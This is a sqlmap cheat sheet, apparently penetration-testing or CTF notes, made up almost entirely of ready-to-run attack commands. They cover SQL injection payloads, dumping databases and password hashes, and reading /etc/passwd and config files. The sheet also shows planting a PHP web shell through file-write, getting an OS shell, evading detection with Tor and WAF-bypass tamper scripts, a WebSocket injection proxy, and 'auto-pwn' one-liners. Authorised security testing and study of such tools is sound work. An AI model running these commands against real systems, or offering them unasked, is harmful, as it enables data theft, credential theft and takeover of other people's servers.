# SQLMap

Automated SQL injection detection and exploitation tool.

**Install:** `apt install sqlmap` or `git clone https://github.com/sqlmapproject/sqlmap.git`

---

## Quick Reference

```bash
# Basic scan
sqlmap -u "http://target.com/page.php?id=1" --batch

# From Burp/ZAP request file
sqlmap -r request.txt --batch

# POST data
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --batch

# With cookies
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# Enumerate databases
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Enumerate tables
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# Dump table
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --dump

# OS shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell
```

---

## Supported DBMS

| DBMS | DBMS | DBMS | DBMS |
|------|------|------|------|
| MySQL | Oracle | PostgreSQL | MS SQL Server |
| SQLite | IBM DB2 | MS Access | Firebird |
| Sybase | SAP MaxDB | MariaDB | CockroachDB |

---

## SQLi Types (--technique=BEUSTQ)

| Char | Technique | Example Payload |
|------|-----------|-----------------|
| `B` | Boolean-based blind | `AND 1=1` |
| `E` | Error-based | `AND GTID_SUBSET(@@version,0)` |
| `U` | Union query-based | `UNION ALL SELECT 1,@@version,3` |
| `S` | Stacked queries | `; DROP TABLE users` |
| `T` | Time-based blind | `AND 1=IF(2>1,SLEEP(5),0)` |
| `Q` | Inline queries | `SELECT (SELECT @@version) FROM` |

---

## Common Flags

### Essential

```bash
--batch              # Non-interactive (auto-accept defaults)
-u URL               # Target URL with parameter
-r FILE              # Read request from file
--data="param=val"   # POST data
-p PARAM             # Specific parameter to test
```

### Enumeration

```bash
--dbs                # Enumerate databases
--tables             # Enumerate tables
--columns            # Enumerate columns
--dump               # Dump table data
--dump-all           # Dump all databases
-D DB                # Specify database
-T TABLE             # Specify table
-C COL1,COL2         # Specify columns
```

### Info Gathering

```bash
--banner             # DBMS banner
--current-user       # Current user
--current-db         # Current database
--hostname           # Server hostname
--is-dba             # Check if DBA privileges
--users              # Enumerate users
--passwords          # Enumerate password hashes
```

### Tuning

```bash
--level=1-5          # Test thoroughness (default 1)
--risk=1-3           # Risk of tests (default 1)
--technique=BEUSTQ   # SQLi techniques to use
--threads=10         # Number of threads
```

### OPSEC

```bash
--random-agent       # Random User-Agent
--mobile             # Mobile User-Agent
--user-agent="..."   # Custom User-Agent
--tor                # Use Tor
--check-tor          # Verify Tor is working
--proxy="http://127.0.0.1:8080"
```

---

## Request Options

### Cookies & Headers

```bash
--cookie="PHPSESSID=abc123; security=low"
-H "X-Forwarded-For: 127.0.0.1"
-H "Authorization: Bearer token123"
```

### HTTP Method

```bash
--method=PUT
--method=DELETE
```

### Mark Injection Point

Use `*` to mark specific parameter(s) to test. You can mark more than one (e.g. cookie and POST body); sqlmap will test each.

```bash
sqlmap -u "http://target.com/api" --data="id=1*&name=test"
sqlmap -u "http://target.com/page?id=1*"
# From request file: add * in the value you want to test (e.g. username=jack&country=Sweden* and cookie user=HASH*)
sqlmap -r index.req --batch
# With time-based blind, parameter #2 (e.g. country) may be the only injectable one; --os-shell/--sql-shell may fail but --file-write can still work
```

### From Burp Request File

```bash
# Save request to file from Burp (Right-click > Copy to file)
sqlmap -r request.txt --batch

# Specify DBMS when known (faster, fewer false positives)
sqlmap -r login.req --batch --dbms mysql
```

Example request file:

```http
GET /page.php?id=1 HTTP/1.1
Host: target.com
Cookie: PHPSESSID=abc123
User-Agent: Mozilla/5.0
```

---

## Database Enumeration

### Step-by-Step

```bash
# 1. Find databases
sqlmap -u "URL" --dbs

# 2. Find tables in database
sqlmap -u "URL" -D dbname --tables

# 3. Find columns in table
sqlmap -u "URL" -D dbname -T tablename --columns

# 4. Dump specific columns
sqlmap -u "URL" -D dbname -T tablename -C username,password --dump

# 5. Dump with conditions
sqlmap -u "URL" -D dbname -T tablename --where="id>10" --dump

# 6. Dump rows range
sqlmap -u "URL" -D dbname -T tablename --start=1 --stop=10 --dump
```

### Search for Data

```bash
# Search for tables containing "user"
sqlmap -u "URL" --search -T user

# Search for columns containing "pass"
sqlmap -u "URL" --search -C pass
```

### Schema

```bash
# Get full database schema
sqlmap -u "URL" --schema
```

---

## File Operations

### Read Files

```bash
sqlmap -u "URL" --file-read="/etc/passwd"
sqlmap -u "URL" --file-read="/var/www/html/config.php"

# File saved to: ~/.sqlmap/output/target.com/files/
```

### Write Files

```bash
# Create shell locally first
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Write to target
sqlmap -u "URL" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Verify
curl "http://target.com/shell.php?cmd=id"
```

**More stable PHP webshell (Kali):** Use **wright.php** instead of a one-liner when you have file-write (e.g. SQLi + DBA). It often behaves better than a simple `?cmd=` shell (cleaner output, fewer "Cannot execute blank command" issues):

```bash
# Location on Kali: /usr/share/webshells/php/wright.php
sqlmap -r request.req --file-write="/usr/share/webshells/php/wright.php" --file-dest="/var/www/html/sb.php" --batch
# Then visit http://TARGET/sb.php (or whatever path you used)
```

Works with time-based blind SQLi; file-write can still succeed when `--os-shell` / `--sql-shell` do not.

---

## OS Command Execution

### Interactive Shell

```bash
sqlmap -u "URL" --os-shell

# If UNION fails, try error-based
sqlmap -u "URL" --os-shell --technique=E
```

### SQL Shell

```bash
sqlmap -u "URL" --sql-shell
```

---

## WAF Bypass

### Anti-CSRF Token

```bash
sqlmap -u "URL" --csrf-token="csrf-token"
```

### Randomize Parameter

```bash
sqlmap -u "http://target.com/?id=1&rp=12345" --randomize=rp
```

### Calculated Parameter (e.g., hash)

```bash
sqlmap -u "http://target.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" \
       --eval="import hashlib; h=hashlib.md5(id.encode()).hexdigest()"
```

### Tamper Scripts

```bash
# Single tamper
sqlmap -u "URL" --tamper=space2comment

# Chained tampers
sqlmap -u "URL" --tamper=between,randomcase,space2comment

# List all tamper scripts
sqlmap --list-tampers
```

#### Common Tamper Scripts

| Script | Description |
|--------|-------------|
| `space2comment` | Replace spaces with /**/ |
| `between` | Replace `>` with `NOT BETWEEN 0 AND` |
| `randomcase` | Random case keywords |
| `equaltolike` | Replace `=` with `LIKE` |
| `base64encode` | Base64 encode payload |
| `charencode` | URL encode characters |
| `space2plus` | Replace spaces with + |
| `space2hash` | Replace spaces with # (MySQL) |
| `percentage` | Add % before each character |
| `modsecurityversioned` | MySQL versioned comments |

### Other Bypass Options

```bash
--random-agent        # Bypass user-agent blacklist
--chunked             # Chunked transfer encoding
--hpp                 # HTTP Parameter Pollution
--skip-waf            # Skip WAF detection
```

---

## Troubleshooting

### All parameters not injectable

When sqlmap reports "all tested parameters do not appear to be injectable", try increasing thoroughness and WAF bypass:

```bash
# Higher level/risk (more payloads; risk 3 can modify data)
sqlmap -r request.req --batch --level=3 --risk=2

# With tamper (e.g. space2comment for WAF)
sqlmap -r request.req --batch --tamper=space2comment
```

### Parse Errors

```bash
sqlmap -u "URL" --parse-errors
```

### Save Traffic

```bash
sqlmap -u "URL" -t /tmp/traffic.txt
```

### Verbose Output

```bash
sqlmap -u "URL" -v 3      # Show payloads
sqlmap -u "URL" -v 6      # Full HTTP traffic
```

### Through Proxy

```bash
sqlmap -u "URL" --proxy="http://127.0.0.1:8080"
```

### Specify Prefix/Suffix

```bash
sqlmap -u "URL" --prefix="%'))" --suffix="-- -"
```

---

## Level & Risk Settings

| Level | Tests |
|-------|-------|
| 1 | Default - basic tests |
| 2 | Add Cookie testing |
| 3 | Add User-Agent/Referer testing |
| 4 | More payloads |
| 5 | Maximum - all boundaries |

| Risk | Tests |
|------|-------|
| 1 | Default - safe tests |
| 2 | Add heavy time-based |
| 3 | Add OR-based (can modify data!) |

```bash
# Maximum testing (slow, noisy)
sqlmap -u "URL" --level=5 --risk=3
```

---

## SQLMap Over WebSockets

SQLMap doesn't natively support WebSockets. Use a Flask proxy to translate HTTP requests to WebSocket messages.

### Flask Proxy Script

```python
# ws_proxy.py
from flask import Flask, request
from websocket import create_connection

app = Flask(__name__)

ws_url = "ws://target.com:9091"  # WebSocket endpoint

@app.route("/")
def handle():
    query = request.args.get('query')
    
    ws = create_connection(ws_url)
    
    # Modify payload format as needed for target
    payload = '{"id":"%s"}' % query
    
    ws.send(payload)
    res = ws.recv()
    ws.close()
    
    return res if res else "no response"

if __name__ == "__main__":
    app.run(debug=False)
```

### Setup & Run

```bash
# Setup
python3 -m venv .venv
source .venv/bin/activate
pip install flask websocket-client

# Run proxy
flask run
# or: python ws_proxy.py

# Now use sqlmap against local proxy
sqlmap -u "http://localhost:5000/?query=1" --batch --dbs
```

### Common WebSocket Payload Formats

```python
# JSON with id parameter
payload = '{"id":"%s"}' % query

# JSON with ticket/search
payload = '{"ticket":"%s"}' % query

# Plain text
payload = query
```

**Reference:** https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html

---

## Useful One-Liners

```bash
# Quick DB dump
sqlmap -u "URL" --dump --batch

# Get shell fast
sqlmap -u "URL" --os-shell --batch --technique=E

# Dump passwords and crack
sqlmap -u "URL" --passwords --batch

# Full auto-pwn
sqlmap -u "URL" --all --batch

# Crawl and test forms
sqlmap -u "http://target.com/" --forms --crawl=2 --batch
```

---

## Output Files

Results saved to: `~/.sqlmap/output/<target>/`

```
~/.sqlmap/output/target.com/
├── dump/           # Dumped tables (CSV)
├── files/          # Downloaded files
├── log             # Session log
└── session.sqlite  # Session data (resume scans)
```

---

## Session Management

```bash
# Resume previous session
sqlmap -u "URL"  # Auto-resumes if session exists

# Fresh scan (ignore session)
sqlmap -u "URL" --flush-session

# Specify output directory
sqlmap -u "URL" --output-dir=/tmp/sqlmap_out
```
